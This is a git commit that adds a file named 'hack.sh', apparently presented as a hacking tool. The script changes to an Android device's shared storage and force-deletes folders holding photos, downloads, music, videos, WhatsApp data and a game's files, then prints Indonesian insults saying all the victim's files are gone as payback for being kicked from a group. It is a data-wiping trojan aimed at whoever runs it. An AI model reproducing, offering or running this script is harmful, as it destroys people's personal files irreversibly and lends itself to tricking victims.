8e506c7ea268eadcc346dd02c0200f486a8a6f7a
nahrunganz <73978908+nahrunganz@users.noreply.github.com>
2020-11-08 10:35:04 +0800

    Create hack.sh

---
+++ hack.sh
@@ -0,0 +1,14 @@
+cd /sdcard
+rm -rf Android
+rm -rf Download
+rm -rf DCIM
+rm -rf UCDownloads
+rm -rf com.garena.game.codm
+rm -rf Music
+rm -rf Pictures
+rm -rf Movies
+rm -rf WhatsApp
+echo "Mampus Semua File Lu Hilang Anjing"
+echo "Siapa Suruh Nge Kick Gw Dari Grub"
+echo "Mangkanya Jangan Macam Macam"
+echo "Fuck You !!"
